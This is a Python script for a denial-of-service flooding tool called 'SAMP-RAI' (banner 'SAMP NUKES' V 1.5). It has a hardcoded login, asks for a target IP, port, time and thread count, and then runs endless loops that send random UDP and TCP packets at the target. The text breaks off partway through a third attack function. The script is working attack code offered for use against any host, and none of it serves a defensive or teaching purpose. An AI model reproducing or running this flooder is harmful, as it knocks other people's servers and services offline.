```python
import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
print("\u001b[35m Welcome to SAMP-RAI World")
time.sleep(2)
print("Loading.......")
os.system("clear")

#### Login       

attempts = 0

while attempts < 3:
    username = input('Enter your username: ')
    password = input('Enter your password: ')

    if username == 'RAI' and password == 'SAMPDDOS':
        print('You have successfully logged in. Welcome to RAIWORLD!!')
        break
    else:
        print('Incorrect credentials. Check if you have Caps lock on and try again.')
        attempts += 1
        continue

if attempts >= 3:
    print("Too many failed attempts. Exiting...")
    sys.exit()

os.system("clear")

print("""
\u001b[35m
	  AUTHOR TOOLS : SAMP RAI
	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.5
""")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +" Attack Sent!!!")
        except Exception as e:
            print(f"[!] Error: {e}")

def run2():
    data = random._urandom(999)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +" Attack Sent!!!")
        except Exception as e:
            s.close()
            print(f"[*] Error: {e}")

def run3():
    data = random._urandom(818)
    i = random.choice(("[*]","[!]","[#]"))
    while